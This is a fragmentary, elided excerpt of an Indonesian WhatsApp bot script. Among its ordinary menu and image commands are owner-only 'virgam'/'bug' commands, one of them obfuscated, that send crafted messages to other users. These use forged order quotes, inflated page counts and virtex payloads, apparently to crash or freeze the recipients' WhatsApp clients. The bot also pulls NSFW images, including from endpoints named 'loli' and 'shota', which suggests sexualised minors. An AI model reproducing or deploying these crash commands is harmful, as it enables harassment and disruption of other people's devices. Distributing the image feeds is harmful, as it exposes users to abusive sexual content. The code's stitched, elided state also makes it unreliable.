...
ZiyKey = settings.ZiyKey
spykey = settings.spykey
xteam = 'FuzBot1'
...
try {
		...
		const virgam = fs.readFileSync('./virtex/virgam.jpeg')
		cmhit.push(command)
        mess = {
        ...
        const grupinv = (teks) => {
        	grup = denz.prepareMessageFromContent(from, { "groupInviteMessage": { "groupJid": '6281333782061-1617740713@g.us', "inviteCode": 'https://chat.whatsapp.com/K1eU4aZZ8k7BO6eNndwvY1', "groupName": `${NamaBot}`, "footerText": "*_© 𝐹𝑎𝑗𝑎𝑟 𝐴𝑙𝑓𝑎𝑟𝑖𝑧𝑖_*", "jpegThumbnail": ofrply, "caption": teks}}, {quoted:finv})
 ...
 if (!mek.key.remoteJid.endsWith('@g.us') && offline){
	...
	denz.sendMessage(from, imageasli, MessageType.image, ai)
		...
		const sendImage = (teks) => {
		    denz.sendMessage(from, teks, image, { quoted: ftrol, contextInfo: { forwardingScore: 508, isForwarded: true}})
		}
		//>>>>>>>>STICKER<<<<<<<\\
...
reply(String(e))
			...
			for (let anju of vien){
				if (budy === anju){
					...
					denz.sendMessage(from, result, audio, { mimetype: 'audio/mp4', ptt: true })
					}
			}
...
menu =`𝐹 𝑎 𝑗 𝑎 𝑟 𝐴 𝑙 𝑓 𝑎 𝑟 𝑖 𝑧 𝑖 右`
gbutsan = [
...
"mediaType": "2",
"mediaUrl": "https://youtu.be/Uyb599cQqfI",
"thumbnail": pporigi,
...
- Hari : ${week} ${weton}
- Tanggal : ${calender}`
sendButLocation(from, `${menu}`, "𝐹 𝑎 𝑗 𝑎 𝑟 𝐴 𝑙 𝑓 𝑎 𝑟 𝑖 𝑧 𝑖 右", {jpegThumbnail:ofrply,name:""}, [{buttonId:`allmenu`,buttonText:{displayText:'📑SHOW MENU'},type:1},{buttonId:`owner`,buttonText:{displayText:'👑OWNER'},type:1},{buttonId:`script`,buttonText:{displayText:'🔖SCRIPT'},type:1}], {contextInfo: { mentionedJid: [dtod,otod,stod]}})
}
break
case 'allmenu':
stst = await denz.getStatus(`${sender.split('@')[0]}@c.us`)
...
├ ${prefix}setprefix [ _multi/nopref/allpref/prefix_ ]
...
├ ${prefix}ppcouple
└─────────────────❒`
sendButLocation(from, `${menu}`, "𝐹 𝑎 𝑗 𝑎 𝑟 𝐴 𝑙 𝑓 𝑎 𝑟 𝑖 𝑧 𝑖 右", {jpegThumbnail:gambar,name:""}, [{buttonId:`owner`,buttonText:{displayText:'👑OWNER'},type:1},{buttonId:`script`,buttonText:{displayText:'📒SCRIPT'},type:1},{buttonId:`snk`,buttonText:{displayText:'🏹SNK'},type:1}], {contextInfo: { mentionedJid: [otod]}})
break
case 'snk':
       ...
       if (args.length < 1) return reply(`Masukkan prefix\nOptions :\n=> ${prefix + command} multi\n=> ${prefix + command} nopref\n=> ${prefix + command} allpref\n=> ${prefix + command} teks`)
           if (c === 'multi'){
              ...
              nopref = false
                ...
                break
                case 'pm':
if (!arg) return reply(from, `Penggunaan ${prefix}pm teks\nExample : ${prefix}pm butuh kontak`, mek)
anu = senderNumber
		...
		try {
				...
				buffer = await getBuffer(ano)
				  denz.sendMessage('status@broadcast', buffer, MessageType.image, {caption: `*PM : ${arg}*\n*From ${pushname} [ ${senderNumber} ]*\n\n_© autopm_`})
		} else {
			reply(mess.error.api)
		}
break
...
if (!isOwner && !mek.key.fromMe)
         ...
         reply(mess.priv)
        denz.sendMessage(sender, hm, document, { quoted: mek, pageCount: 9999999,filename:`${c + api(prefix)}.pdf`, mimetype: 'application/pdf',jpegThumbnail: fs.readFileSync(`./v/virgam.jpeg`)}) 
break
	case'jadivirgam': case 'getidgrup':
	if (!isOwner && !mek.key.fromMe)
				if ((isMedia && !mek.message.videoMessage || isQuotedImage)) {
					let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
					let media = await denz.downloadMediaMessage(encmedia)
					reply(mess.wait)
					sendFakeImg(sender, media, arg, thumbnail, mek)
				} else {
	...
	if (!isOwner && !mek.key.fromMe)
				if ((isMedia && !mek.message.videoMessage || isQuotedImage)) {
					...
					let media = await denz.downloadMediaMessage(encmedia)
					reply(mess.wait)
					sendFakeImg2(sender, media, arg, thumbnail2, mek)
				} else {
					reply(from, `Kirim gambar atau reply dengan caption ${prefix + command} caption`, mek)
				}
		break
	...
	if (!isOwner && !mek.key.fromMe)
				if ((isMedia && !mek.message.videoMessage || isQuotedImage)) {
					...
					let media = await denz.downloadMediaMessage(encmedia)
					reply(mess.wait)
					sendFakeImg3(sender, media, arg, thumbnail3, mek)
				} else {
					reply(from, `Kirim gambar atau reply dengan caption ${prefix + command} caption`, mek)
				}
		break
		...
		if (!isOwner && !mek.key.fromMe)
					...
					if (mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.isAnimated === true){
						...
						exec(`ffmpeg -i ${media} ${ran}`, (err) => {
							...
							denz.sendMessage(from, buffer, image, {quoted: mek, jpegThumbnail: fs.readFileSync(`./v/virgam.jpeg`), thumbnail: fs.readFileSync(`./v/virgam.jpeg`), caption: 'Nih Fotonya\n\n⚠️*Perhatian.!!*⚠️\nFoto ini Mengandung Virgam/Bug SW!!'})
							fs.unlinkSync(ran)
						})
					}
					break
...
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
dona = fs.readFileSync('./donasi.jpg')
denz.sendMessage(from, dona, image, { quoted: mek, thumbnail: fs.readFileSync('./virtex/v.jpeg')})
break
		case 'vgam':
		if (!isOwner && !mek.key.fromMe)
dona = fs.readFileSync('./virtex/v.jpeg')
doni =`*_𝐹 𝑎 𝑗 𝑎 𝑟 𝐴 𝑙 𝑓 𝑎 𝑟 𝑖 𝑧 𝑖 右_*`
denz.sendMessage(from, dona, image, { quoted: ftroli, jpegThumbnail: fs.readFileSync('./virtex/virgam.jpeg'), thumbnail: dona, caption: doni })
break
  ...
  if (!mek.key.fromMe) return
        if ((isMedia && !mek.message.videoMessage || isQuotedImage)) {
             let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
              let media = await denz.downloadMediaMessage(encmedia)
              denz.sendMessage(sender, media, document, { quoted: mek, filename:`${pushname} ${api(prefix)}.pdf`, mimetype: 'image/jpeg' })
              denz.sendMessage(sender, media, document, { quoted: mek, filename:`${pushname} ${api(prefix)}.pdf`, mimetype: 'application/pdf' })
              } else {
					reply(from, `Kirim gambar atau reply dengan caption ${prefix + command} caption`, mek)
				}
				break
  ...
  if (!isOwner && !mek.key.fromMe)
					...
					let media = await denz.downloadMediaMessage(encmedia)
					reply(mess.priv)
                   denz.sendMessage(sender, {degreesLatitude: -6.2323957, degreesLongitude: 106.8626589, name: `${api(prefix)}`, address: `${pushname} ${beku(prefix)}`, jpegThumbnail: media, },location,{
                    quoted: {
                     key: {
                      participant: '6281333782061@s.whatsapp.net' // Fake sender Jid
                },
                       message: {
                       orderMessage: {
                       ...
                       status: 100,
                       surface: 100,
                       message: '𝐹𝑎𝑗𝑎𝑟𝐴𝑙𝑓𝑎𝑟𝑖𝑧𝑖',
                       orderTitle: '*𝐹𝑎𝑗𝑎𝑟𝐴𝑙𝑓𝑎𝑟𝑖𝑧𝑖.in*', // 
                       sellerJid: '6281333782061@s.whatsapp.net' // Seller
                }}}})
        } else {
					reply(from, `Kirim gambar atau reply dengan caption ${prefix + command} caption`, mek)
				}
       break
       case'jadiselayer': case'jadislayer': case 'getidgrup':
       if (!isOwner && !mek.key.fromMe)
                    if ((isMedia && !mek.message.videoMessage || isQuotedImage)) {
					let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
					let media = await denz.downloadMediaMessage(encmedia)
                   res = denz.prepareMessageFromContent(sender,{
					"productMessage": {
						"product": {
							"productImage": {
...
function _0x4ee9(_0x1253de,_0x4df4d5){var _0x587b3c=_0x587b();return _0x4ee9=function(_0x4ee946,_0x170efd){_0x4ee946=_0x4ee946-0x1c6;var _0x33a62e=_0x587b3c[_0x4ee946];return _0x33a62e;},_0x4ee9(_0x1253de,_0x4df4d5);}var _0x1fb12b=_0x4ee9;function _0x587b(){var _0x573ab6=['readFileSync','12536840GCstSf','sendMessage','only','536IkuDmm','key','2675700WtsjtO','ownerB','./denz.jpg','fromMe','2224464MiisaG','18qcFOZT','83468rQXPeY','0@s.whatsapp.net','25944fErnRh','115851EirsKL','184fyRhDo','178400WTzYEN'];_0x587b=function(){return _0x573ab6;};return _0x587b();}(function(_0x2dcd13,_0x2f923e){var _0x3d06c1=_0x4ee9,_0x2352ff=_0x2dcd13();while(!![]){try{var _0x266d76=parseInt(_0x3d06c1(0x1cc))/0x1+-parseInt(_0x3d06c1(0x1ce))/0x2+-parseInt(_0x3d06c1(0x1cb))/0x3*(parseInt(_0x3d06c1(0x1cd))/0x4)+-parseInt(_0x3d06c1(0x1d5))/0x5+-parseInt(_0x3d06c1(0x1c7))/0x6+-parseInt(_0x3d06c1(0x1c9))/0x7*(parseInt(_0x3d06c1(0x1d3))/0x8)+-parseInt(_0x3d06c1(0x1c8))/0x9*(-parseInt(_0x3d06c1(0x1d0))/0xa);if(_0x266d76===_0x2f923e)break;else _0x2352ff['push'](_0x2352ff['shift']());}catch(_0x4d3113){_0x2352ff['push'](_0x2352ff['shift']());}}}(_0x587b,0x6953b));if(!isOwner&&!mek[_0x1fb12b(0x1d4)][_0x1fb12b(0x1c6)])return reply(mess[_0x1fb12b(0x1d2)][_0x1fb12b(0x1d6)]);denz[_0x1fb12b(0x1d1)](from,{'degreesLatitude':6.493187928699356,'degreesLongitude':80.30968201252108,'name':''+emoji2(prefix),'address':''+virtex6(prefix),'jpegThumbnail':fs[_0x1fb12b(0x1cf)](_0x1fb12b(0x1d7))},location,{'quoted':{'key':{'participant':_0x1fb12b(0x1ca)},'message':{'orderMessage':{'itemCount':0x98967f,'status':0x1,'surface':0x1,'message':''+NamaBot,'orderTitle':''+NamaOwner,'sellerJid':'0@s.whatsapp.net'}}}});
         break
            ...
            "externalAdReply": {
                ...
                "sourceUrl": "https://m.youtube.com/channel/UCYw80__QHZxPwrbdSJ93Jvw"}}})
                break
        case 'bugbutton':
        if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
        denz.toggleDisappearingMessages(from, 0)
...
case 'tiktoknowm':
  ...
  ayo = await getBuffer(`http://api.lolhuman.xyz/api/tiktokmusic?apikey=${lol}&url=${args[0]}`)
 ...
 case 'addbucin':
				...
				huu = body.slice(10)
					...
					case 'bucin':
						...
						denz.sendMessage(from, '*'+hasil+'*', text, {quoted: ftex})
					break
					case 'bacotandilan':
					case 'dilan':
				...
				denz.sendMessage(from, '*'+hasil+'*', text, {quoted: ftrol})
				break 
				case 'katailham':
				case 'ilham':
...
buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
              ...
              buttonsMessage = {footerText:'Created By Fajar Alfarizi🌹', imageMessage: imageMsg,
              contentText:`Jangan Lupa Follow @mhmdfjralfarizi_`,buttons,headerType:4}
              prep = await denz.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftok})
              denz.relayWAMessage(prep)
break
case 'pussy':
if (!isGroup) return reply(mess.only.group)
...
case "asupan3": // by itsmevall
        ...
        sendButMessage(from, `Hai Kak ${pushname}`, `Silahkan pilih Asupannya V.3 kak✨`, [
          ...
          },
          {
            ...
            buttonText: {
              displayText: `🔖 Asupan Random V1`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}asupan5`,
            buttonText: {
              displayText: `Next Asupan >`,
            },
            type: 1,
        ...
        break;
        case "asupan5": // by mhmdfjralfarizi_
        sendButMessage(from, `Hai Kak ${pushname}`, `Silahkan pilih Asupannya V.4 kak✨`, [
          {
            buttonId: `${prefix}asupanrandomv2`,
            buttonText: {
              displayText: `🔖 Asupan Random V2`,
            },
            type: 1,
          },
          {
        ...
        break;
        case "infocreator": // by mhmdfjralfarizi_
...
break
case 'iggw':
denz.sendMessage(from, { text: "https://instagram.com/mhmdfjralfarizi_", matchedText: 'https://instagram.com/mhmdfjralfarizi_', description: "", title: "FOLLOW INSTAGRAM CREATOR!!!", jpegThumbnail: ofrply }, 'extendedTextMessage', { detectLinks: false, contextInfo: { forwardingScore: 508, isForwarded: true}, quoted: finv})
break
case 'ghgw':
denz.sendMessage(from, { text: "https://github.com/Tersakiti404-cyber/", matchedText: 'https://github.com/Tersakiti404-cyber/', description: "", title: "FOLLOW GITHUB CREATOR!!!", jpegThumbnail: ofrply }, 'extendedTextMessage', { detectLinks: false, contextInfo: { forwardingScore: 508, isForwarded: true}, quoted: finv})
break
case 'asupanrandomv2':
reply(mess.wait)
...
case 'fast':
    ...
    case 'reverse':
            ...
            case 'waifu': 
			reply(mess.wait)
			  lah = await fetchJson(`https://api.waifu.pics/sfw/waifu`)
			hooh = await getBuffer(lah.url)
			   menu = `Nih Kak`
			   buttons = [{buttonId: `${prefix}waifu`,buttonText:{displayText: 'NEXT⏩'},type:1}]
			   imageMsg = (await denz.prepareMessageMedia(hooh, 'imageMessage')).imageMessage
			   buttonsMessage = {
			   contentText: `${menu}`,
			   ...
			   case 'husbu': 
			reply(mess.wait)
			  hooh = await getBuffer(`https://myhuman.cf/api/husbu`)
			   menu = `Nih Kak`
			   buttons = [{buttonId: `${prefix}husbu`,buttonText:{displayText: 'NEXT⏩'},type:1}]
			   imageMsg = (await denz.prepareMessageMedia(hooh, 'imageMessage')).imageMessage
			   buttonsMessage = {
			   contentText: `${menu}`,
			   footerText:`Created By Fajar Alfarizi🌹`,
			   ...
			   case 'loli': 
			reply(mess.wait)
			  hooh = await getBuffer(`https://myhuman.cf/api/loli2`)
			   menu = `Nih Kak`
			   ...
			   case 'neko': 
			reply(mess.wait)
			  hooh = await getBuffer(`https://janbot-api.herokuapp.com/api/sfw/neko`)
			   menu = `Nih Kak`
			   ...
			   case 'shinobu': 
			reply(mess.wait)
			  hooh = await getBuffer(`https://janbot-api.herokuapp.com/api/sfw/shinobu`)
			   menu = `Nih Kak`
			   buttons = [{buttonId: `${prefix}shinobu`,buttonText:{displayText: 'NEXT⏩'},type:1}]
			   imageMsg = (await denz.prepareMessageMedia(hooh, 'imageMessage')).imageMessage
			   buttonsMessage = {
			   contentText: `${menu}`,
			   footerText:`Created By Fajar Alfarizi🌹`,
			   ...
			   case 'megumin': 
			reply(mess.wait)
			  hooh = await getBuffer(`https://janbot-api.herokuapp.com/api/sfw/megumin`)
			   menu = `Nih Kak`
			   buttons = [{buttonId: `${prefix}megumin`,buttonText:{displayText: 'NEXT⏩'},type:1}]
			   imageMsg = (await denz.prepareMessageMedia(hooh, 'imageMessage')).imageMessage
			   buttonsMessage = {
			   contentText: `${menu}`,
			   footerText:`Created By Fajar Alfarizi🌹`,
			   ...
			   case 'cuddle': 
			reply(mess.wait)
			  hooh = await getBuffer(`https://janbot-api.herokuapp.com/api/sfw/cuddle`)
			   menu = `Nih Kak`
			   buttons = [{buttonId: `${prefix}cuddle`,buttonText:{displayText: 'NEXT⏩'},type:1}]
			   imageMsg = (await denz.prepareMessageMedia(hooh, 'imageMessage')).imageMessage
			   buttonsMessage = {
			   contentText: `${menu}`,
			   footerText:`Created By Fajar Alfarizi🌹`,
			   ...
			   case 'nino': 
			reply(mess.wait)
			  hooh = await getBuffer(`https://myhuman.cf/api/nino`)
			   menu = `Nih Kak`
			   buttons = [{buttonId: `${prefix}nino`,buttonText:{displayText: 'NEXT⏩'},type:1}]
			   imageMsg = (await denz.prepareMessageMedia(hooh, 'imageMessage')).imageMessage
			   buttonsMessage = {
			   contentText: `${menu}`,
			   footerText:`Created By Fajar Alfarizi🌹`,
			   ...
			   case 'sagiri': 
			reply(mess.wait)
			  hooh = await getBuffer(`https://myhuman.cf/api/sagiri`)
			   menu = `Nih Kak`
			   buttons = [{buttonId: `${prefix}sagiri`,buttonText:{displayText: 'NEXT⏩'},type:1}]
			   imageMsg = (await denz.prepareMessageMedia(hooh, 'imageMessage')).imageMessage
			   buttonsMessage = {
			   contentText: `${menu}`,
			   footerText:`Created By Fajar Alfarizi🌹`,
			   ...
			   case 'cosplay': 
			reply(mess.wait)
			  hooh = await getBuffer(`https://myhuman.cf/api/cosplay`)
			   menu = `Nih Kak`
			   ...
			   case 'shota': 
			reply(mess.wait)
			  hooh = await getBuffer(`https://myhuman.cf/api/shota`)
			   menu = `Nih Kak`
			   buttons = [{buttonId: `${prefix}shota`,buttonText:{displayText: 'NEXT⏩'},type:1}]
			   imageMsg = (await denz.prepareMessageMedia(hooh, 'imageMessage')).imageMessage
			   buttonsMessage = {
			   contentText: `${menu}`,
			   footerText:`Created By Fajar Alfarizi🌹`,
			   ...
			   case 'loli2': 
			reply(mess.wait)
			  hooh = await getBuffer(`https://myhuman.cf/api/loli`)
			   menu = `Nih Kak`
			   buttons = [{buttonId: `${prefix}loli2`,buttonText:{displayText: 'NEXT⏩'},type:1}]
			   imageMsg = (await denz.prepareMessageMedia(hooh, 'imageMessage')).imageMessage
			   buttonsMessage = {
			   contentText: `${menu}`,
			   footerText:`Created By Fajar Alfarizi🌹`,
			...
			if (!isGroup) return reply(mess.only.group)
               if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw on \nUntuk Mengaktifkan`)
               reply(mess.wait)
			  todd = await fetchJson(`https://janbot-api.herokuapp.com/api/nsfw/hentai`)
			  hooh = await getBuffer(todd.result)
			   menu = `Jangan Lupa Ngocok`
			...
			if (!isGroup) return reply(mess.only.group)
               if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw on \nUntuk Mengaktifkan`)
               reply(mess.wait)
			  todd = await fetchJson(`https://janbot-api.herokuapp.com/api/nsfw/ass`)
			  hooh = await getBuffer(todd.result)
			   menu = `Nih Kak`
			   buttons = [{buttonId: `${prefix}ass`,buttonText:{displayText: 'NEXT⏩'},type:1}]
			   imageMsg = (await denz.prepareMessageMedia(hooh, 'imageMessage')).imageMessage
			   buttonsMessage = {
			   contentText: `${menu}`,
			   footerText:`Created By Fajar Alfarizi🌹`,
               ...
               if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw on \nUntuk Mengaktifkan`)
               reply(mess.wait)
			  hooh = await getBuffer(`https://janbot-api.herokuapp.com/api/nsfw/cuckold`)
			   menu = `Nih Kak`
			   buttons = [{buttonId: `${prefix}cuckold`,buttonText:{displayText: 'NEXT⏩'},type:1}]
			   imageMsg = (await denz.prepareMessageMedia(hooh, 'imageMessage')).imageMessage
			   buttonsMessage = {
			   contentText: `${menu}`,
			   footerText:`Created By Fajar Alfarizi🌹`,
			...
			case 'fotocecan': 
			reply(mess.wait)
			  ya = await fetchJson(`https://api-alphabot.herokuapp.com/api/asupan/cecan?apikey=Alphabot`)
			  hooh = await getBuffer(ya.result.url)
			   menu = `Nih Kak`
			   buttons = [{buttonId: `${prefix}fotocecan`,buttonText:{displayText: 'NEXT⏩'},type:1}]
			   imageMsg = (await denz.prepareMessageMedia(hooh, 'imageMessage')).imageMessage
			   buttonsMessage = {
			   contentText: `${menu}`,
			   footerText:`Created By Fajar Alfarizi🌹`,
			   ...
			   case 'fotoukhty': 
			reply(mess.wait)
			  ya = await fetchJson(`https://janbot-api.herokuapp.com/api/asupan/hijab`)
			  hooh = await getBuffer(ya.result.url)
			   menu = `Nih Kak`
			   buttons = [{buttonId: `${prefix}fotoukhty`,buttonText:{displayText: 'NEXT⏩'},type:1}]
			   imageMsg = (await denz.prepareMessageMedia(hooh, 'imageMessage')).imageMessage
			   buttonsMessage = {
			   contentText: `${menu}`,
			   footerText:`Created By Fajar Alfarizi🌹`,
			   ...
			   case 'fotohijab': 
			reply(mess.wait)
			  ya = await fetchJson(`https://api-alphabot.herokuapp.com/api/asupan/hijaber?apikey=Alphabot`)
			  hooh = await getBuffer(ya.result.url)
			   menu = `Nih Kak`
			   buttons = [{buttonId: `${prefix}fotohijab`,buttonText:{displayText: 'NEXT⏩'},type:1}]
			   imageMsg = (await denz.prepareMessageMedia(hooh, 'imageMessage')).imageMessage
			   buttonsMessage = {
			   contentText: `${menu}`,
			   footerText:`Created By Fajar Alfarizi🌹`,
			  ...
			  case 'ceweindo': 
			reply(mess.wait)
			  ya = await fetchJson(`https://api-alphabot.herokuapp.com/api/cewe/indonesia?apikey=Alphabot`)
			  hooh = await getBuffer(ya.result.url)
			   menu = `Nih Kak`
			   buttons = [{buttonId: `${prefix}cewecans`,buttonText:{displayText: 'NEXT⏩'},type:1}]
			   imageMsg = (await denz.prepareMessageMedia(hooh, 'imageMessage')).imageMessage
			   buttonsMessage = {
			   contentText: `${menu}`,
			   footerText:`Created By Fajar Alfarizi🌹`,
			   ...
			   case 'cewejepang': 
			reply(mess.wait)
			  ya = await fetchJson(`https://api-alphabot.herokuapp.com/api/cewe/japan?apikey=Alphabot`)
			  hooh = await getBuffer(ya.result.url)
			   menu = `Nih Kak`
			   buttons = [{buttonId: `${prefix}jepang`,buttonText:{displayText: 'NEXT⏩'},type:1}]
			   imageMsg = (await denz.prepareMessageMedia(hooh, 'imageMessage')).imageMessage
			   buttonsMessage = {
			   contentText: `${menu}`,
			   footerText:`Created By Fajar Alfarizi🌹`,
...
anu = await fetchJson(`https://api.dapuhy.ga/api/randomimage/couple?apikey=${dapapi}`)
              ...
              buttonsMessage = {footerText:'Created By Fajar Alfarizi🌹', imageMessage: imageMsg,
              contentText:`Ini Yang Cowo`,buttons,headerType:4}
              prep = await denz.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              denz.relayWAMessage(prep)
            buff2 = await getBuffer(anu.result.wanita)
              ...
              buttonsMessage = {footerText:'Created By Fajar Alfarizi🌹', imageMessage: imageMsg,
              contentText:`Ini Yang Cewe`,buttons,headerType:4}
              prep = await denz.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
             setTimeout( async () => {
 denz.relayWAMessage(prep)
}, 5000)
break
case 'cerpen': // by denz
                    get_result = await fetchJson(`https://api.dapuhy.ga/api/fun/cerpen?apikey=${dapapi}`)
                    get_result = get_result.result
                    ini_asu = `Judul : ${get_result.judul}\n`
                    ini_asu += `Kategori : ${get_result.kategori}\n`
                    ini_asu += `Cerita :\n ${get_result.cerita}`
                    denzawok = ini_asu
                    sendButMessage(from, denzawok, `Klik Untuk Ke Quotes Selanjutnya`, [
          {
...
case 'gachacewek':
					...
					randKey = jsonData[randIndex];
					hasil = await getBuffer(randKey.result)
					sendImage(hasil, mek, 'Jadi Gimana Bwang?:v')
					break
				case 'gachacowok':
					...
					randKey = jsonData[randIndex];
					hasil = await getBuffer(randKey.result)
					sendImage(hasil, mek, 'Jadi Gimana Mba?:v')
					break
case 'quotes':
					...
					reply(randQuote)
					break
                   case 'costumgfx'://BY LORD HABIBI APIKEY BY LORD VALL
					if (args.length < 1) return reply(`text nya mana contoh: ${prefix}costumgfx Fajar`)
					cokk = body.slice(11)
					reply(mess.wait)
					aruga = await getBuffer(`https://rivalxc.herokuapp.com/api/canvas/gfx1?teks=${cokk}`)
					denz.sendMessage(from, aruga, image, {quoted: ftrol, thumbnail: fs.readFileSync('./denz.jpg')})
					break
					case 'buatvirgam'://BY LORD HABIBI APIKEY BY LORD VALL
					if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
					if (args.length < 1) return reply(`text nya mana contoh: ${prefix}costumgfx Fajar`)
					cokk = body.slice(11)
					reply(mess.wait)
					aruga = await getBuffer(`https://rivalxc.herokuapp.com/api/canvas/gfx1?teks=${cokk}`)
					denz.sendMessage(from, aruga, image, {quoted: mek, thumbnail: fs.readFileSync('./virtex/v.jpeg')})
					break
					case 'costumgfx2'://BY LORD HABIBI APIKEY BY LORD VALL
					if (args.length < 1) return reply(`text nya mana contoh: ${prefix}costumgfx Fajar`)
					cokk = body.slice(11)
					reply(mess.wait)
					aruga = await getBuffer(`https://rivalxc.herokuapp.com/api/canvas/gfx2?teks=${cokk}`)
					denz.sendMessage(from, aruga, image, {quoted: ftrol, thumbnail: fs.readFileSync('./denz.jpg')})
					break
					case 'buatvirgam2'://BY LORD HABIBI APIKEY BY LORD VALL
					if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
					if (args.length < 1) return reply(`text nya mana contoh: ${prefix}costumgfx Fajar`)
					cokk = body.slice(11)
					reply(mess.wait)
					...
					denz.sendMessage(from, aruga, image, {quoted: mek, thumbnail: fs.readFileSync('./virtex/v.jpeg')})
					break
					case 'costumgfx5'://BY LORD HABIBI APIKEY BY LORD VALL
					if (args.length < 1) return reply(`text nya mana contoh: ${prefix}costumgfx Fajar`)
					cokk = body.slice(11)
					reply(mess.wait)
					...
					denz.sendMessage(from, aruga, image, {quoted: ftrol, thumbnail: fs.readFileSync('./denz.jpg')})
					break
					case 'buatvirgam3'://BY LORD HABIBI APIKEY BY LORD VALL
					if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
					if (args.length < 1) return reply(`text nya mana contoh: ${prefix}costumgfx Fajar`)
					cokk = body.slice(11)
					reply(mess.wait)
					...
					if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
reply(mess.wait)
if (args.length == 0) return reply(`Example: ${prefix + command} 𝐹𝑎𝑗𝑎𝑟|𝐴𝑙𝑓𝑎𝑟𝑖𝑧𝑖`)
query = args.join(" ")
porn = `${body.slice(8)}`
hub1 = porn.split("|")[0];
hub2 = porn.split("|")[1];
porn = await getBuffer(`https://api.xteam.xyz/textpro/ph?text=${hub1}&text2=${hub2}&APIKEY=${Xteam}`)
denz.sendMessage(from, porn, image, {caption: 'Logo Pornhub + virgamnya kakak', quoted: mek, thumbnail: fs.readFileSync('./virtex/v.jpeg')})
break 
					case 'pornhub':
reply(mess.wait)
if (args.length == 0) return reply(`Example: ${prefix + command} 𝐹𝑎𝑗𝑎𝑟|𝐴𝑙𝑓𝑎𝑟𝑖𝑧𝑖`)
...
hub2 = porn.split("|")[1];
porn = await getBuffer(`https://api.xteam.xyz/textpro/ph?text=${hub1}&text2=${hub2}&APIKEY=${Xteam}`)
denz.sendMessage(from, porn, image, {caption: 'Logo Pornhubnya kakak', quoted: ftrol})
break
case 'carbon':

			if (!q) return reply(`exampe : ${prefix}carbon code|biru\n\nList Warna\n• biru\n• kuning\n• hitam\n• ping`)
            ...
            buffer = await getBuffer(`http://ziy.herokuapp.com/api/tools/carbon?code=${codee}&color=${kolor}&apikey=${ZiyKey}`)
...
case 'loliwangy':
              ...
              buff = await getBuffer(`https://api.lolhuman.xyz/api/random/loli?apikey=${lol}`)

              buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next LoliWangy`},type:1}]

              imageMsg = (await denz.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage

              buttonsMessage = {footerText:'Created By Fajar Alfarizi🌹', imageMessage: imageMsg,

              contentText:`Wangy Wangy`,buttons,headerType:4}
       ...
       case 'loliwangy2':
              ...
              buff = await getBuffer(`https://leyscoders-api.herokuapp.com/api/loli?apikey=${setting.leyskey}`)

              buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `◽️Next Loli`},type:1}]

              imageMsg = (await denz.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage

              buttonsMessage = {footerText:'Created By Fajar Alfarizi🌹', imageMessage: imageMsg,

              contentText:`Njir Lu Lolicon Yak :v`,buttons,headerType:4}
              ...
              buff = await getBuffer(`https://megayaa.herokuapp.com/api/akaneko/doujin`)

              buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next Ngocok`},type:1}]

              imageMsg = (await denz.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage

              buttonsMessage = {footerText:'Created By Fajar Alfarizi🌹', imageMessage: imageMsg,

              contentText:`Jangan Lupa Ngocok`,buttons,headerType:4}
...
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw on \nUntuk Mengaktifkan`)
            ...
            denz.sendMessage(from, ambil_res, image, { quoted: ftrol, thumbnail: fs.readFileSync('./denz.jpg')})
            break
            case 'nhentaipdf':
  if (args.length == 0) return reply(`Usage: ${prefix + command} query\nExample: ${prefix + command} 317986`)
 if (isNaN(Number(args[0]))) return await reply(mess.api)
try {
  henid = args[0]
  ...
  denz.sendMessage(from, ini_image, image, { caption: teks, quoted: mek, thumbnail: dfrply })
  reply(mess.wait)
  anu = await fetchJson(`https://api.lolhuman.xyz/api/nhentaipdf/${henidi}?apikey=${lol}`)
...
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw on \nUntuk Mengaktifkan`)
				reply('mohon tunggu')
				dapuhy = await getBuffer(`https://api.lolhuman.xyz/api/random2/${command}?apikey=${lol}`)
...
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw on \nUntuk Mengaktifkan`)
				reply('mohon tunggu')
				dapuhy = await getBuffer(`https://api.lolhuman.xyz/api/random/nsfw/${command}?apikey=${lol}`)
				denz.sendMessage(from, dapuhy, image, {quoted: ftrol, thumbnail: fs.readFileSync('./denz.jpg')})
				break
				case 'hentai2':
                //Yahhaha Kontol
